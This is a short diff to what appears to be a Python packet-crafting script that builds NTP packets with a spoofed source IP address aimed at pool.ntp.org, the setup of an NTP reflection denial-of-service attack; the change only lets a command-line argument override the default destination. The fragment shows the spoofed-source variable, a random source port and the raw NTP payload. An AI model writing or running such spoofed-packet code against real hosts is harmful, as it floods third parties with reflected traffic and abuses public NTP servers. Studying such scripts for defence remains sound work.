@@ -18,9 +18,10 @@ A = sys.argv[1] # spoofed source IP address
 
 #A = "127.0.0.1" # spoofed source IP address
 
+B = "pool.ntp.org"
 if (len(sys.argv) == 3):
     B = sys.argv[2] # "pool.ntp.org" # destination IP address
-B = "pool.ntp.org"
+
 C = RandShort() # source port
 D = 80 # destination port
 payload = ("\x1b\x00\x00\x00"+"\x00"*11*4) # packet NTP payload 
